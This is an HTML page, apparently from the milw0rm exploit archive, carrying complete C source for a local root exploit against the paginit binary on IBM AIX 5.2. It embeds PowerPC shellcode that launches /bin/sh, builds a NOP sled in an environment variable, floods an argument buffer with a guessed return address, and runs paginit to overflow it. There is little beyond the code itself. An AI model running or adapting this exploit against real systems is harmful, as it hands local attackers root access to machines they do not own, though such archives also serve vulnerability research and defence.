<html><head><title>AIX 5.2 paginit Local Root Exploit</title></head><pre>/*
 *
 *    IBM AIX paginit root exploit
 *
 *    I just wanted to play with PowerPC (Tested on 5.2)
 *
 *    intropy (intropy &lt;at&gt; caughq.org)
 *
 */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define DEBUG 1
#define BUFFERSIZE 8000
#define EGGSIZE 4003

#define NOP 0x60
#define ADDRESS 0x2ff22fff-EGGSIZE

/* lsd */
char shellcode_binsh[] =
&quot;\x7c\xa5\x2a\x79&quot;     /* xor.    r5,r5,r5             */
&quot;\x40\x82\xff\xfd&quot;     /* bnel    &lt;shellcode&gt;          */
&quot;\x7f\xe8\x02\xa6&quot;     /* mflr    r31                  */
&quot;\x3b\xff\x01\x20&quot;     /* cal     r31,0x120(r31)       */
&quot;\x38\x7f\xff\x08&quot;     /* cal     r3,-248(r31)         */
&quot;\x38\x9f\xff\x10&quot;     /* cal     r4,-240(r31)         */
&quot;\x90\x7f\xff\x10&quot;     /* st      r3,-240(r31)         */
&quot;\x90\xbf\xff\x14&quot;     /* st      r5,-236(r31)         */
&quot;\x88\x5f\xff\x0f&quot;     /* lbz     r2,-241(r31)         */
&quot;\x98\xbf\xff\x0f&quot;     /* stb     r5,-241(r31)         */
&quot;\x4c\xc6\x33\x42&quot;     /* crorc   cr6,cr6,cr6          */
&quot;\x44\xff\xff\x02&quot;     /* svca                         */
&quot;/bin/sh&quot;
&quot;\x05&quot;;

unsigned long cex_load_environment(char *env_buffer, char *address_buffer, char *payload, int environment_size, int buffer_size) {
        int count, env_size = strlen(payload) + environment_size + 4 + 1;
        unsigned long address, *ret_addressp;
        
        if (DEBUG) printf(&quot;Adding nops to environment buffer...&quot;);
        for ( count = 0; count &lt; env_size - strlen(payload) - 1; count++ ) {
            *(env_buffer++) = NOP;
        }
        if (DEBUG) printf(&quot;size %d...\n&quot;, count);
        if (DEBUG) printf(&quot;Adding payload to environment buffer...&quot;);
        for ( count = 0; count &lt; strlen(payload); count++ ) {
            *(env_buffer++) = payload[count];
        }
        if (DEBUG) printf(&quot;size %d...\n&quot;, count);

        env_buffer[env_size - 1] = '\0';

        memcpy(env_buffer, &quot;CAU=&quot;, 4);

	memset(address_buffer, 'A', buffer_size);

        address = ADDRESS;

        if (DEBUG) printf(&quot;Going for address @ 0x%lx\n&quot;, address);

        if (DEBUG) printf(&quot;Adding return address to buffer...&quot;);
        ret_addressp = (unsigned long *)(address_buffer+2);
        for ( count = 0; count &lt; buffer_size; count += 4) {
                *(ret_addressp++) = address;
        }
        if (DEBUG) printf(&quot;size %d...\n&quot;, count);

        address_buffer[buffer_size - 1] = '\0';

        return( 0 );
}

int main()
{
    char *buffer, *egg;
    char *args[3], *envs[2];

    buffer = (char *)malloc(BUFFERSIZE);
    egg = (char *)malloc(EGGSIZE);

    cex_load_environment(egg, buffer, (char *)&amp;shellcode_binsh, EGGSIZE, BUFFERSIZE);

    args[0] = &quot;/usr/bin/paginit&quot;;
    args[1] = buffer;
    args[2] = NULL;

    envs[0] = egg;
    envs[1] = NULL;

    execve( &quot;/usr/bin/paginit&quot;, args, envs );

    return( 0 );
}

// milw0rm.com [2005-06-14]</pre></html>